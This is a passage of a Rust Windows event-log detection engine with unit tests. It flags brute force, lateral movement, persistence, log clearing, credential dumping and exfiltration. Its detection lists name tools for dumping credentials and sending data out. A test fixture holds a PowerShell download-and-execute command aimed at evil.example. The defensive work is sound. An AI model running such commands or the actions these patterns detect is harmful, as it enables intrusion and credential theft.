        let member = ev.fields.user.clone().unwrap_or_else(|| "?".into());
        let by = ev.d("SubjectUserName").unwrap_or_else(|| "?".into());
        let key = format!("{name}|{}", member.to_ascii_lowercase());
        let aggregation = format!("grupo={group}; membro={member}; por={by}");
        if let Some(agg) = self.agg(&R_PRIV_002, &key, || aggregation, ev) {
            agg.detail = format!("Membro {member} adicionado ao grupo {group} por {by}.");
            agg.add(ev);
        }
    }

    // --- persistência -------------------------------------------------------

    fn service_installed(&mut self, ev: &Ev<'_>) {
        if ev.id == 7045 && !ev.provider_contains("service control manager") {
            return;
        }
        let name = ev.d("ServiceName").unwrap_or_else(|| "?".into());
        let path = ev
            .d("ImagePath")
            .or_else(|| ev.d("ServiceFileName"))
            .unwrap_or_default();
        let lower_path = path.to_ascii_lowercase();
        let lower_name = name.to_ascii_lowercase();

        let remote_exec =
            lower_contains_any(&lower_name, &["psexesvc", "paexec", "remcom", "csexec"])
                || lower_contains_any(&lower_path, &["psexesvc", "paexec", "\\admin$\\"])
                || (lower_path.starts_with("\\\\") && lower_path.contains(".exe"));
        let suspicious = lower_contains_any(
            &lower_path,
            &[
                "\\temp\\",
                "\\appdata\\",
                "\\users\\public",
                "\\programdata\\",
                "powershell",
                "pwsh",
                "cmd.exe /c",
                "cmd /c",
                "%comspec%",
                "mshta",
                "rundll32",
                "regsvr32",
                "wscript",
                "cscript",
            ],
        );

        let key = format!("{lower_name}|{lower_path}");
        let aggregation = format!("serviço={name}; imagem={path}");
        if remote_exec {
            let aggregation = aggregation.clone();
            if let Some(agg) = self.agg(&R_LATERAL_004, &key, || aggregation, ev) {
                agg.user = ev.fields.user.clone();
                agg.add(ev);
                if !path.is_empty() {
                    agg.ioc("FILE_PATH", &path, &ev.reference());
                }
            }
        }
        if let Some(agg) = self.agg(&R_PERS_002, &key, || aggregation, ev) {
            if suspicious || remote_exec {
                agg.severity = "HIGH";
                agg.detail = "A imagem do serviço está em pasta temporária ou de perfil, ou usa um interpretador de comandos.".into();
            }
            agg.add(ev);
            if !path.is_empty() {
                agg.ioc("FILE_PATH", &path, &ev.reference());
            }
        }
    }

    fn scheduled_task(&mut self, ev: &Ev<'_>) {
        let task = ev.d("TaskName").unwrap_or_else(|| "?".into());
        let content = ev.d("TaskContent").unwrap_or_default();
        let command = content
            .split_once("<Command>")
            .and_then(|(_, rest)| rest.split_once("</Command>"))
            .map(|(command, _)| command.trim().to_string());
        let lower = format!(
            "{} {}",
            command.as_deref().unwrap_or("").to_ascii_lowercase(),
            content.to_ascii_lowercase()
        );
        let suspicious = lower_contains_any(
            &lower,
            &[
                "powershell",
                "pwsh",
                "cmd.exe",
                "wscript",
                "cscript",
                "mshta",
                "rundll32",
                "regsvr32",
                "\\temp\\",
                "\\appdata\\",
                "\\users\\public",
            ],
        );
        let key = task.to_ascii_lowercase();
        let aggregation = format!("tarefa={task}");
        if let Some(agg) = self.agg(&R_PERS_003, &key, || aggregation, ev) {
            if suspicious {
                agg.severity = "MEDIUM";
            }
            if let Some(command) = command.as_deref() {
                agg.detail = format!(
                    "Comando da tarefa: {}.",
                    command.chars().take(200).collect::<String>()
                );
                agg.ioc("FILE_PATH", command, &ev.reference());
            }
            agg.add(ev);
        }
    }

    // --- evasão ---------------------------------------------------------------

    fn log_cleared(&mut self, ev: &Ev<'_>) {
        let user = ev.fields.user.clone().unwrap_or_else(|| "?".into());
        let channel = ev
            .d("Channel")
            .or_else(|| ev.fields.channel.clone())
            .unwrap_or_else(|| "?".into());
        let key = format!(
            "{}|{}",
            channel.to_ascii_lowercase(),
            user.to_ascii_lowercase()
        );
        let aggregation = format!("log={channel}; por={user}");
        if let Some(agg) = self.agg(&R_EVAS_001, &key, || aggregation, ev) {
            agg.add(ev);
        }
    }

    fn audit_policy_changed(&mut self, ev: &Ev<'_>) {
        let user = ev.fields.user.clone().unwrap_or_else(|| "?".into());
        let key = user.to_ascii_lowercase();
        let aggregation = format!("por={user}");
        if let Some(agg) = self.agg(&R_EVAS_002, &key, || aggregation, ev) {
            agg.add(ev);
        }
    }

    // --- rede interna -----------------------------------------------------

    fn admin_share(&mut self, ev: &Ev<'_>) {
        let Some(share) = ev.d("ShareName") else {
            return;
        };
        let lower = share.to_ascii_lowercase();
        let tail = lower.rsplit('\\').next().unwrap_or(&lower);
        let administrative = tail == "admin$"
            || (tail.len() == 2
                && tail.ends_with('$')
                && tail
                    .chars()
                    .next()
                    .is_some_and(|ch| ch.is_ascii_alphabetic()));
        if !administrative {
            return;
        }
        let Some(ip) = ev
            .fields
            .src_ip
            .clone()
            .filter(|ip| is_ip(ip) && !is_loopback_or_local(ip))
        else {
            return;
        };
        let user = ev.fields.user.clone().unwrap_or_else(|| "?".into());
        let key = format!("{}|{}|{}", user.to_ascii_lowercase(), ip, tail);
        let aggregation = format!("conta={user}; origem={ip}; compartilhamento={share}");
        if let Some(agg) = self.agg(&R_LATERAL_003, &key, || aggregation, ev) {
            agg.add(ev);
            agg.ioc("IP", &ip, &ev.reference());
        }
    }

    // --- linha de comando -----------------------------------------------------

    fn command_line(&mut self, ev: &Ev<'_>, command: &str) {
        let lower = command.to_ascii_lowercase();
        let host = ev.fields.host.clone().unwrap_or_else(|| "?".into());
        let user = ev.fields.user.clone().unwrap_or_else(|| "?".into());
        let scope = format!(
            "{}|{}",
            host.to_ascii_lowercase(),
            user.to_ascii_lowercase()
        );
        let aggregation = format!("máquina={host}; conta={user}");
        let is_script_block = ev.fields.action.as_deref() == Some("powershell_script_block");
        let is_powershell = is_script_block || lower_contains_any(&lower, &["powershell", "pwsh"]);
        if is_powershell
            && powershell_suspicious(&lower, is_script_block)
            && let Some(agg) = self.agg(&R_EXEC_001, &scope, || aggregation.clone(), ev)
        {
            agg.add(ev);
            for url in extract_urls(command, 3) {
                agg.ioc("URL", &url, &ev.reference());
            }
        }
        if credential_dumping(&lower)
            && let Some(agg) = self.agg(&R_CRED_001, &scope, || aggregation.clone(), ev)
        {
            agg.add(ev);
        }
        if upload_tool(&lower)
            && let Some(agg) = self.agg(&R_EXFIL_001, &scope, || aggregation.clone(), ev)
        {
            agg.add(ev);
            for url in extract_urls(command, 3) {
                agg.ioc("URL", &url, &ev.reference());
            }
        }
        if archive_tool(&lower)
            && let Some(agg) = self.agg(&R_COLL_001, &scope, || aggregation.clone(), ev)
        {
            agg.add(ev);
        }
    }

    // --- rede de saída ------------------------------------------------------

    fn outbound_connection(&mut self, ev: &Ev<'_>) {
        if ev.fields.outcome.as_deref() == Some("failure") {
            return;
        }
        let Some(destination) = ev.fields.dst_ip.clone().filter(|ip| is_public_ip(ip)) else {
            return;
        };
        // Sentido: 5156 traz `Direction` (%%14593 = saída); Sysmon traz `Initiated`.
        let outbound = match ev.id {
            5156 => ev
                .d("Direction")
                .is_none_or(|direction| direction.contains("14593")),
            3 => ev
                .d("Initiated")
                .is_none_or(|value| value.eq_ignore_ascii_case("true")),
            _ => false,
        };
        if !outbound {
            return;
        }
        let Some(process) = ev.fields.process.clone() else {
            return;
        };
        let program = basename(&process).to_ascii_lowercase();
        let program = program.trim_end_matches(".exe").to_string();
        if ![
            "powershell",
            "pwsh",
            "cmd",
            "curl",
            "certutil",
            "bitsadmin",
            "wscript",
            "cscript",
            "mshta",
            "rundll32",
            "regsvr32",
            "rclone",
            "wget",
            "ftp",
            "scp",
            "winscp",
        ]
        .contains(&program.as_str())
        {
            return;
        }
        let host = ev.fields.host.clone().unwrap_or_else(|| "?".into());
        let key = format!("{}|{}|{}", host.to_ascii_lowercase(), program, destination);
        let aggregation = format!("máquina={host}; processo={program}; destino={destination}");
        if let Some(agg) = self.agg(&R_EXFIL_002, &key, || aggregation, ev) {
            agg.add(ev);
            agg.ioc("IP", &destination, &ev.reference());
            agg.ioc("FILE_PATH", &process, &ev.reference());
        }
    }

    /// Fecha a análise: candidatos ordenados de forma determinística.
    pub fn finish(self) -> (Vec<DetectionCandidate>, DetectorStats) {
        let Detector {
            evidence_id,
            aggs,
            mut stats,
            ..
        } = self;
        let mut candidates: Vec<DetectionCandidate> = aggs
            .into_values()
            .filter(|agg| agg.count > 0)
            .map(|mut agg| {
                // Mesma origem contra várias contas é spray de senhas, não força bruta.
                if agg.rule.id == "R-AUTH-001" && agg.key.starts_with("ip:") && agg.users.len() >= 3
                {
                    agg.sub_technique = Some("T1110.003");
                    agg.detail = format!(
                        "{} contas distintas visadas pela mesma origem (spray de senhas).",
                        agg.users.len()
                    );
                }
                agg.into_candidate(&evidence_id)
            })
            .collect();
        candidates.sort_by(|a, b| {
            (epoch_micros(&a.first_seen), &a.rule_id, &a.candidate_key).cmp(&(
                epoch_micros(&b.first_seen),
                &b.rule_id,
                &b.candidate_key,
            ))
        });
        stats.candidates = candidates.len() as u64;
        (candidates, stats)
    }
}

// ---------------------------------------------------------------------------
// Padrões de linha de comando
// ---------------------------------------------------------------------------

/// Abreviações aceitas pelo `powershell.exe` para `-EncodedCommand`.
fn is_encoded_command_flag(token: &str) -> bool {
    let flag = token.trim_start_matches(['-', '/']);
    token.starts_with(['-', '/']) && !flag.is_empty() && "encodedcommand".starts_with(flag)
}

fn powershell_suspicious(lower: &str, script_block: bool) -> bool {
    let strong = lower_contains_any(
        lower,
        &[
            "frombase64string",
            "downloadstring",
            "downloadfile",
            "net.webclient",
            "invoke-expression",
            "[system.convert]::frombase64",
            "invoke-webrequest",
            "start-bitstransfer",
        ],
    ) || lower.contains("iex ")
        || lower.contains("iex(");
    if strong {
        return true;
    }
    if script_block {
        return false;
    }
    lower.split_whitespace().any(is_encoded_command_flag)
}

fn credential_dumping(lower: &str) -> bool {
    lower_contains_any(
        lower,
        &[
            "mimikatz",
            "sekurlsa",
            "lsadump",
            "kerberos::",
            "dpapi::",
            "secretsdump",
            "hashdump",
            "invoke-mimikatz",
        ],
    ) || (lower.contains("procdump") && lower.contains("lsass"))
        || (lower.contains("minidumpwritedump") && lower.contains("lsass"))
        || (lower.contains("comsvcs") && lower.contains("minidump"))
        || (lower.contains("ntdsutil") && (lower.contains("ifm") || lower.contains("ntds")))
        || (lower.contains("reg")
            && lower.contains("save")
            && lower_contains_any(lower, &["hklm\\sam", "hklm\\security", "hklm\\system"]))
        || (lower.contains("vssadmin") && lower.contains("ntds"))
}

fn upload_tool(lower: &str) -> bool {
    let has_word = |word: &str| {
        lower
            .split(|ch: char| !(ch.is_ascii_alphanumeric() || ch == '-' || ch == '_' || ch == '.'))
            .any(|token| token == word || token == format!("{word}.exe"))
    };
    has_word("rclone")
        || has_word("megacmd")
        || lower.contains("mega-put")
        || has_word("winscp")
        || has_word("pscp")
        || (has_word("curl")
            && lower_contains_any(
                lower,
                &[
                    " -t ",
                    "--upload-file",
                    " -f ",
                    "--form",
                    "--data-binary",
                    " -d @",
                    "--data @",
                ],
            ))
        || (lower_contains_any(
            lower,
            &["invoke-webrequest", "invoke-restmethod", "iwr ", "irm "],
        ) && lower_contains_any(lower, &["-method post", "-method put", "-infile"]))
        || (has_word("bitsadmin") && lower.contains("/upload"))
        || lower.contains("aws s3 cp")
        || lower.contains("aws s3 sync")
        || (has_word("azcopy") && lower.contains(" copy"))
        || lower.contains("gsutil cp")
}

fn archive_tool(lower: &str) -> bool {
    lower.contains("compress-archive")
        || lower.contains("7z a ")
        || lower.contains("7z.exe a ")
        || lower.contains("7za a ")
        || lower.contains("rar a ")
        || lower.contains("winrar.exe a ")
        || lower.contains("zip -r ")
}

// ---------------------------------------------------------------------------
// Testes
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    /// Instante `10:00:00 + minute*60 + second` (os segundos podem passar de 59).
    fn ts(minute: i64, second: i64) -> String {
        let total = minute * 60 + second;
        format!("2026-03-01T10:{:02}:{:02}.000000Z", total / 60, total % 60)
    }

    /// Monta um registro mínimo. `data` entra em `EventData`.
    fn record(id: u32, provider: &str, host: &str, data: Value) -> Value {
        json!({"Event": {
            "System": {
                "Provider": {"#attributes": {"Name": provider}},
                "EventID": id, "Channel": "Security", "Computer": host
            },
            "EventData": data
        }})
    }

    fn security(id: u32, data: Value) -> Value {
        record(id, "Microsoft-Windows-Security-Auditing", "DC01", data)
    }

    struct Feed {
        detector: Detector,
        next_record: u64,
    }

    impl Feed {
        fn new() -> Self {
            Self {
                detector: Detector::new("evidence/test.evtx"),
                next_record: 1,
            }
        }

        fn push(&mut self, timestamp: &str, record: Value) {
            let fields = normalize::event_fields(&record);
            // Como no runner: registro sem EventID não alimenta as regras.
            let Some(id) = normalize::event_id(&record) else {
                return;
            };
            let ev = Ev {
                record_id: self.next_record,
                timestamp,
                micros: epoch_micros(timestamp),
                id,
                data: &record,
                fields: &fields,
            };
            self.next_record += 1;
            self.detector.observe(&ev);
        }

        fn finish(self) -> Vec<DetectionCandidate> {
            self.detector.finish().0
        }
    }

    fn by_rule<'a>(
        candidates: &'a [DetectionCandidate],
        rule: &str,
    ) -> Vec<&'a DetectionCandidate> {
        candidates
            .iter()
            .filter(|candidate| candidate.rule_id == rule)
            .collect()
    }

    fn failed(user: &str, ip: &str) -> Value {
        security(
            4625,
            json!({"TargetUserName": user, "IpAddress": ip, "LogonType": 3}),
        )
    }

    fn success(user: &str, ip: &str, logon_type: u32) -> Value {
        security(
            4624,
            json!({"TargetUserName": user, "IpAddress": ip, "LogonType": logon_type}),
        )
    }

    // --- IP público ---

    #[test]
    fn public_ip_classification_covers_private_special_and_ipv6_ranges() {
        for public in [
            "8.8.8.8",
            "185.220.101.5",
            "45.33.32.156",
            "2606:4700:4700::1111",
        ] {
            assert!(is_public_ip(public), "{public} deveria ser público");
        }
        for not_public in [
            "10.1.2.3",
            "172.16.0.1",
            "172.31.255.255",
            "192.168.0.10",
            "127.0.0.1",
            "169.254.1.1",
            "100.64.0.1",
            "0.0.0.0",
            "224.0.0.1",
            "255.255.255.255",
            "203.0.113.7",
            "198.51.100.1",
            "192.0.2.5",
            "198.18.0.1",
            "::1",
            "fe80::1",
            "fd00::1",
            "ff02::1",
            "2001:db8::1",
            "::ffff:10.0.0.1",
            "-",
            "",
            "não é ip",
        ] {
            assert!(
                !is_public_ip(not_public),
                "{not_public:?} não deveria ser público"
            );
        }
        // IPv4 mapeado em IPv6 segue a regra do IPv4.
        assert!(is_public_ip("::ffff:8.8.8.8"));
    }

    // --- R-AUTH-001 / R-AUTH-002 ---

    #[test]
    fn nine_failures_are_not_a_burst_ten_inside_five_minutes_are() {
        let mut nine = Feed::new();
        for second in 0..9 {
            nine.push(&ts(0, second), failed("admin", "185.220.101.5"));
        }
        assert!(
            by_rule(&nine.finish(), "R-AUTH-001").is_empty(),
            "nove falhas não bastam"
        );

        let mut ten = Feed::new();
        for second in 0..10 {
            ten.push(&ts(0, second * 10), failed("admin", "185.220.101.5"));
        }
        let candidates = ten.finish();
        let burst = by_rule(&candidates, "R-AUTH-001");
        // Uma por chave: a origem e a conta.
        assert_eq!(burst.len(), 2, "{burst:?}");
        let by_ip = burst
            .iter()
            .find(|c| c.aggregation.starts_with("origem="))
            .expect("by ip");
        assert_eq!(by_ip.count, 10);
        assert_eq!(by_ip.tactic, "CREDENTIAL_ACCESS");
        assert_eq!(by_ip.technique_id, "T1110");
        assert_eq!(by_ip.confidence, "LOW");
        assert!(by_ip.event_refs.contains(&"record:1".to_string()));
        assert!(
            by_ip
                .iocs
                .iter()
                .any(|ioc| ioc.ioc_type == "IP" && ioc.value == "185.220.101.5")
        );
    }

    #[test]
    fn failures_spread_over_more_than_the_window_are_not_a_burst() {
        let mut feed = Feed::new();
        // Dez falhas, uma a cada 2 minutos: 18 minutos no total.
        for index in 0..10 {
            feed.push(&ts(index * 2, 0), failed("admin", "185.220.101.5"));
        }
        assert!(by_rule(&feed.finish(), "R-AUTH-001").is_empty());
    }

    #[test]
    fn one_origin_against_many_accounts_is_flagged_as_password_spraying() {
        let mut feed = Feed::new();
        for index in 0..12 {
            feed.push(
                &ts(0, index * 5),
                failed(&format!("user{}", index % 4), "185.220.101.5"),
            );
        }
        let candidates = feed.finish();
        let by_ip = by_rule(&candidates, "R-AUTH-001")
            .into_iter()
            .find(|c| c.aggregation.starts_with("origem="))
            .expect("by ip");
        assert_eq!(by_ip.sub_technique_id.as_deref(), Some("T1110.003"));
        assert!(by_ip.description.contains("spray"), "{}", by_ip.description);
    }

    #[test]
    fn a_success_after_a_burst_is_initial_access_and_a_success_without_one_is_not() {
        let mut feed = Feed::new();
        for second in 0..10 {
            feed.push(&ts(0, second * 10), failed("admin", "185.220.101.5"));
        }
        feed.push(&ts(10, 0), success("admin", "185.220.101.5", 3));
        let candidates = feed.finish();
        let hit = by_rule(&candidates, "R-AUTH-002");
        assert_eq!(hit.len(), 1, "{hit:?}");
        assert_eq!(hit[0].tactic, "INITIAL_ACCESS");
        assert_eq!(hit[0].severity, "HIGH");
        assert_eq!(hit[0].confidence, "MEDIUM");
        // As falhas anteriores e o sucesso entram como evidência do candidato.
        assert!(hit[0].count >= 2);

        let mut quiet = Feed::new();
        quiet.push(&ts(0, 0), success("admin", "185.220.101.5", 3));
        assert!(by_rule(&quiet.finish(), "R-AUTH-002").is_empty());
    }

    #[test]
    fn a_success_long_after_the_burst_is_not_linked_to_it() {
        let mut feed = Feed::new();
        for second in 0..10 {
            feed.push(&ts(0, second * 10), failed("admin", "185.220.101.5"));
        }
        // Uma hora depois.
        feed.push(
            "2026-03-01T11:30:00.000000Z",
            success("admin", "185.220.101.5", 3),
        );
        assert!(by_rule(&feed.finish(), "R-AUTH-002").is_empty());
    }

    // --- R-ACCESS-001 / R-LATERAL-001 ---

    #[test]
    fn remote_logon_from_a_public_ip_is_initial_access_and_from_a_private_ip_is_not() {
        let mut feed = Feed::new();
        feed.push(&ts(0, 0), success("ana", "185.220.101.5", 10));
        feed.push(&ts(0, 5), success("ana", "185.220.101.5", 10));
        feed.push(&ts(0, 6), success("bob", "10.0.0.7", 3));
        feed.push(&ts(0, 7), success("carl", "185.220.101.9", 2)); // tipo 2: console
        let candidates = feed.finish();
        let access = by_rule(&candidates, "R-ACCESS-001");
        assert_eq!(access.len(), 1, "{access:?}");
        assert_eq!(access[0].count, 2);
        assert_eq!(access[0].severity, "HIGH", "RDP de IP público");
        assert_eq!(access[0].tactic, "INITIAL_ACCESS");
        assert!(
            access[0]
                .iocs
                .iter()
                .any(|ioc| ioc.value == "185.220.101.5")
        );
    }

    #[test]
    fn rdp_from_an_internal_machine_is_lateral_movement_but_the_local_console_is_not() {
        let mut feed = Feed::new();
        feed.push(&ts(1, 0), success("admin", "10.0.0.7", 10));
        feed.push(&ts(1, 1), success("admin", "127.0.0.1", 10));
        feed.push(&ts(1, 2), success("admin", "-", 10));
        feed.push(&ts(1, 3), success("admin", "10.0.0.8", 3)); // rede interna comum: não dispara
        let candidates = feed.finish();
        let lateral = by_rule(&candidates, "R-LATERAL-001");
        assert_eq!(lateral.len(), 1, "{lateral:?}");
        assert_eq!(lateral[0].src_ip.as_deref(), Some("10.0.0.7"));
        assert_eq!(lateral[0].sub_technique_id.as_deref(), Some("T1021.001"));
    }

    // --- R-LATERAL-002 / 003 / 004 ---

    #[test]
    fn explicit_credentials_toward_another_server_fire_but_localhost_does_not() {
        let mut feed = Feed::new();
        feed.push(&ts(2, 0), security(4648, json!({"SubjectUserName": "svc", "TargetUserName": "admin", "TargetServerName": "FILESRV01.corp.local", "IpAddress": "10.0.0.5"})));
        feed.push(&ts(2, 1), security(4648, json!({"SubjectUserName": "svc", "TargetUserName": "admin", "TargetServerName": "localhost"})));
        feed.push(&ts(2, 2), security(4648, json!({"SubjectUserName": "svc", "TargetUserName": "admin", "TargetServerName": "dc01.corp.local"})));
        let candidates = feed.finish();
        let hit = by_rule(&candidates, "R-LATERAL-002");
        assert_eq!(hit.len(), 1, "{hit:?}");
        assert!(hit[0].aggregation.contains("FILESRV01"));
        assert!(hit[0].iocs.iter().any(|ioc| ioc.ioc_type == "HOSTNAME"));
    }

    #[test]
    fn administrative_shares_from_a_remote_ip_fire_and_ipc_or_local_access_does_not() {
        let mut feed = Feed::new();
        let share = |name: &str, ip: &str| {
            security(
                5145,
                json!({"SubjectUserName": "ana", "ShareName": name, "IpAddress": ip}),
            )
        };
        feed.push(&ts(3, 0), share("\\\\*\\ADMIN$", "10.0.0.9"));
        feed.push(&ts(3, 1), share("\\\\*\\C$", "10.0.0.9"));
        feed.push(&ts(3, 2), share("\\\\*\\IPC$", "10.0.0.9"));
        feed.push(&ts(3, 3), share("\\\\*\\ADMIN$", "127.0.0.1"));
        feed.push(&ts(3, 4), share("\\\\*\\Publico", "10.0.0.9"));
        let candidates = feed.finish();
        let hits = by_rule(&candidates, "R-LATERAL-003");
        assert_eq!(hits.len(), 2, "ADMIN$ e C$: {hits:?}");
        assert!(
            hits.iter()
                .all(|hit| hit.sub_technique_id.as_deref() == Some("T1021.002"))
        );
    }

    #[test]
    fn a_psexec_style_service_is_lateral_movement_and_a_normal_service_is_only_persistence_context()
    {
        let mut feed = Feed::new();
        let service = |name: &str, path: &str| {
            record(
                7045,
                "Service Control Manager",
                "SRV02",
                json!({"ServiceName": name, "ImagePath": path, "AccountName": "LocalSystem"}),
            )
        };
        feed.push(&ts(4, 0), service("PSEXESVC", "%SystemRoot%\\PSEXESVC.exe"));
        feed.push(
            &ts(4, 1),
            service("Spooler", "C:\\Windows\\System32\\spoolsv.exe"),
        );
        feed.push(&ts(4, 2), service("Updater", "C:\\Users\\Public\\upd.exe"));
        let candidates = feed.finish();
        let lateral = by_rule(&candidates, "R-LATERAL-004");
        assert_eq!(lateral.len(), 1, "{lateral:?}");
        assert_eq!(lateral[0].severity, "HIGH");
        let persistence = by_rule(&candidates, "R-PERS-002");
        let severity_of = |needle: &str| {
            persistence
                .iter()
                .find(|c| c.aggregation.contains(needle))
                .map(|c| c.severity.clone())
                .unwrap_or_default()
        };
        assert_eq!(severity_of("Spooler"), "LOW");
        assert_eq!(severity_of("Updater"), "HIGH", "imagem em pasta pública");
        assert_eq!(severity_of("PSEXESVC"), "HIGH");
    }

    #[test]
    fn a_service_event_from_another_provider_is_ignored() {
        let mut feed = Feed::new();
        feed.push(
            &ts(4, 0),
            record(
                7045,
                "Outro-Provedor",
                "SRV02",
                json!({"ServiceName": "PSEXESVC", "ImagePath": "x.exe"}),
            ),
        );
        assert!(feed.finish().is_empty());
    }

    // --- privilégios e contas ---

    #[test]
    fn sensitive_privileges_fire_for_user_accounts_but_not_for_system_accounts() {
        let mut feed = Feed::new();
        let privs = |user: &str, list: &str| {
            security(
                4672,
                json!({"SubjectUserName": user, "PrivilegeList": list}),
            )
        };
        feed.push(
            &ts(5, 0),
            privs(
                "fsir",
                "SeSecurityPrivilege\n\t\t\tSeDebugPrivilege\n\t\t\tSeBackupPrivilege",
            ),
        );
        feed.push(&ts(5, 1), privs("fsir", "SeDebugPrivilege"));
        feed.push(
            &ts(5, 2),
            privs("SYSTEM", "SeTcbPrivilege\nSeDebugPrivilege"),
        );
        feed.push(&ts(5, 3), privs("DWM-1", "SeTcbPrivilege"));
        feed.push(&ts(5, 4), privs("SRV$", "SeDebugPrivilege"));
        feed.push(&ts(5, 5), privs("bob", "SeChangeNotifyPrivilege")); // não sensível
        let candidates = feed.finish();
        let hits = by_rule(&candidates, "R-PRIV-001");
        assert_eq!(hits.len(), 1, "{hits:?}");
        assert_eq!(hits[0].user.as_deref(), Some("fsir"));
        assert_eq!(hits[0].count, 2);
        assert_eq!(hits[0].severity, "LOW");
        assert!(hits[0].limitations.contains("administrador"));
    }

    #[test]
    fn adding_a_member_to_administrators_fires_and_adding_to_users_does_not() {
        let mut feed = Feed::new();
        let add = |sid: &str, group: &str, member: &str| {
            security(
                4732,
                json!({"TargetUserName": group, "TargetSid": sid, "MemberName": member, "SubjectUserName": "admin"}),
            )
        };
        feed.push(
            &ts(6, 0),
            add("S-1-5-32-544", "Administrators", "CN=eve,DC=corp"),
        );
        feed.push(&ts(6, 1), add("S-1-5-32-545", "Users", "CN=eve,DC=corp"));
        feed.push(
            &ts(6, 2),
            add("S-1-5-21-1-2-3-512", "Domain Admins", "CN=mal,DC=corp"),
        );
        let candidates = feed.finish();
        let hits = by_rule(&candidates, "R-PRIV-002");
        assert_eq!(hits.len(), 2, "{hits:?}");
        assert!(
            hits.iter()
                .all(|hit| hit.severity == "HIGH" && hit.confidence == "LOW")
        );
    }

    #[test]
    fn account_creation_is_reported_with_who_created_it() {
        let mut feed = Feed::new();
        feed.push(
            &ts(6, 30),
            security(
                4720,
                json!({"TargetUserName": "backdoor", "SubjectUserName": "admin"}),
            ),
        );
        let candidates = feed.finish();
        let hits = by_rule(&candidates, "R-PERS-001");
        assert_eq!(hits.len(), 1);
        assert!(hits[0].description.contains("admin"));
        assert_eq!(hits[0].tactic, "PERSISTENCE");
    }

    // --- persistência / evasão ---

    #[test]
    fn a_scheduled_task_running_powershell_is_medium_and_a_plain_one_is_low() {
        let mut feed = Feed::new();
        let task = |name: &str, command: &str| {
            security(
                4698,
                json!({"SubjectUserName": "admin", "TaskName": name, "TaskContent": format!("<Task><Actions><Exec><Command>{command}</Command></Exec></Actions></Task>")}),
            )
        };
        feed.push(&ts(7, 0), task("\\Backup", "C:\\Tools\\backup.exe"));
        feed.push(&ts(7, 1), task("\\Evil", "powershell.exe"));
        let candidates = feed.finish();
        let hits = by_rule(&candidates, "R-PERS-003");
        let severity = |name: &str| {
            hits.iter()
                .find(|h| h.aggregation.contains(name))
                .map(|h| h.severity.clone())
        };
        assert_eq!(severity("Backup").as_deref(), Some("LOW"));
        assert_eq!(severity("Evil").as_deref(), Some("MEDIUM"));
    }

    #[test]
    fn clearing_the_security_log_is_defense_evasion() {
        let mut feed = Feed::new();
        let cleared = json!({"Event": {
            "System": {"Provider": {"#attributes": {"Name": "Microsoft-Windows-Eventlog"}}, "EventID": 1102, "Channel": "Security", "Computer": "DC01"},
            "UserData": {"LogFileCleared": {"SubjectUserName": "mallory"}}
        }});
        feed.push(&ts(8, 0), cleared);
        // Mesmo id em outro provedor não conta.
        feed.push(
            &ts(8, 1),
            record(1102, "Outro", "DC01", json!({"SubjectUserName": "x"})),
        );
        let candidates = feed.finish();
        let hits = by_rule(&candidates, "R-EVAS-001");
        assert_eq!(hits.len(), 1, "{hits:?}");
        assert_eq!(hits[0].user.as_deref(), Some("mallory"));
        assert_eq!(hits[0].technique_id, "T1070");
        assert_eq!(hits[0].severity, "HIGH");
    }

    #[test]
    fn audit_policy_changes_fire_and_the_neighbouring_events_do_not() {
        let mut feed = Feed::new();
        feed.push(
            &ts(8, 30),
            security(4719, json!({"SubjectUserName": "mallory"})),
        );
        // Vizinhos que não são a regra: 4907 (auditoria de objeto), 4902.
        feed.push(
            &ts(8, 31),
            security(4907, json!({"SubjectUserName": "mallory"})),
        );
        feed.push(
            &ts(8, 32),
            security(4902, json!({"SubjectUserName": "mallory"})),
        );
        let candidates = feed.finish();
        let hits = by_rule(&candidates, "R-EVAS-002");
        assert_eq!(hits.len(), 1, "{hits:?}");
        assert_eq!(hits[0].technique_id, "T1562");
        assert_eq!(hits[0].sub_technique_id.as_deref(), Some("T1562.002"));
        assert_eq!(
            candidates.len(),
            1,
            "os vizinhos não geram candidato: {candidates:?}"
        );
    }

    #[test]
    fn near_miss_account_and_task_events_do_not_fire_persistence_rules() {
        let mut feed = Feed::new();
        // 4722 (conta habilitada), 4726 (excluída), 4699 (tarefa excluída), 4702 (atualizada).
        feed.push(
            &ts(6, 40),
            security(4722, json!({"TargetUserName": "x", "SubjectUserName": "y"})),
        );
        feed.push(
            &ts(6, 41),
            security(4726, json!({"TargetUserName": "x", "SubjectUserName": "y"})),
        );
        feed.push(
            &ts(6, 42),
            security(4699, json!({"TaskName": "\\T", "SubjectUserName": "y"})),
        );
        feed.push(
            &ts(6, 43),
            security(4702, json!({"TaskName": "\\T", "SubjectUserName": "y"})),
        );
        // 4720 sem a conta criada: sem sujeito, sem candidato.
        feed.push(&ts(6, 44), security(4720, json!({"SubjectUserName": "y"})));
        assert!(feed.finish().is_empty());
    }

    #[test]
    fn a_member_added_to_an_unprivileged_group_by_name_alone_does_not_fire() {
        let mut feed = Feed::new();
        feed.push(
            &ts(6, 50),
            security(4728, json!({"TargetUserName": "Marketing", "TargetSid": "S-1-5-21-1-2-3-1105", "MemberName": "CN=bob"})),
        );
        assert!(by_rule(&feed.finish(), "R-PRIV-002").is_empty());
    }

    // --- linha de comando ---

    fn process(command: &str) -> Value {
        security(
            4688,
            json!({"SubjectUserName": "bob", "NewProcessName": "C:\\Windows\\System32\\cmd.exe", "CommandLine": command}),
        )
    }

    #[test]
    fn encoded_and_download_powershell_fire_and_plain_powershell_does_not() {
        let mut feed = Feed::new();
        feed.push(
            &ts(9, 0),
            process("powershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA"),
        );
        feed.push(&ts(9, 1), process("powershell -e SQBFAFgA"));
        feed.push(&ts(9, 2), process("powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.example/a.ps1')\""));
        feed.push(
            &ts(9, 3),
            process("powershell -File C:\\scripts\\backup.ps1"),
        );
        feed.push(&ts(9, 4), process("powershell -Encoding UTF8 -File x.ps1")); // -Encoding não é -EncodedCommand
        let candidates = feed.finish();
        let hits = by_rule(&candidates, "R-EXEC-001");
        assert_eq!(hits.len(), 1, "agrega por máquina e conta: {hits:?}");
        assert_eq!(hits[0].count, 3, "só as três suspeitas");
        assert!(
            hits[0]
                .iocs
                .iter()
                .any(|ioc| ioc.ioc_type == "URL" && ioc.value.starts_with("http://evil.example"))
        );
    }

    #[test]
    fn script_block_logging_is_read_but_encoded_flags_are_not_guessed_in_scripts() {
        let mut feed = Feed::new();
        let block = |text: &str| {
            record(
                4104,
